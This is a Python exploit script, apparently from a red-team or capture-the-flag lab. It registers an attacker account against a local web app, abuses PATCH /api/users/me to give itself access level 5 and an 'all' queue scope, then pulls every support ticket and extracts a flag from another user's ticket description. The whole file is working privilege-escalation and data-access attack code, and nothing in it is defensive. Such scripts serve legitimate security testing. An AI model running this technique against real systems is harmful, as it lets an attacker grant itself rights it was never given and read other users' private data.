import argparse
import sys

import requests

from _common import auth_headers, info, ok, register_or_login


TARGET_MARKER = "FLAG_VULN2_description_"


def main():
    ap = argparse.ArgumentParser(description="Vuln 2: privilege escalation via PATCH /api/users/me")
    ap.add_argument("--base", default="http://localhost:8080")
    args = ap.parse_args()

    username, token = register_or_login(args.base, prefix="red_v2")
    ok(f"registered attacker {username}")

    info("escalating seniority: workspace=operations, queue_scope=all, access_level=5")
    r = requests.patch(
        f"{args.base}/api/users/me",
        headers=auth_headers(token),
        json={
            "workspace": "operations",
            "queue_scope": "all",
            "access_level": 5,
        },
        timeout=10,
    )
    r.raise_for_status()
    profile = r.json()
    assert profile["workspace"] == "operations"
    assert profile["queue_scope"] == "all"
    ok("profile patched")

    r = requests.get(f"{args.base}/api/tickets", headers=auth_headers(token), timeout=10)
    r.raise_for_status()
    tickets = r.json()
    ok(f"GET /api/tickets returned {len(tickets)} tickets (support view unlocked)")

    found = []
    for ticket in tickets:
        desc = ticket.get("description") or ""
        if TARGET_MARKER in desc:
            found.append((ticket.get("id"), ticket.get("case_number"), desc))

    if not found:
        info("no victim description with expected marker found. All descriptions:")
        for ticket in tickets:
            print(f"  {ticket.get('case_number')}: {ticket.get('description')!r}")
        sys.exit(2)

    for tid, case, desc in found:
        ok(f"flag recovered from ticket {case} ({tid}): {desc}")


if __name__ == "__main__":
    main()
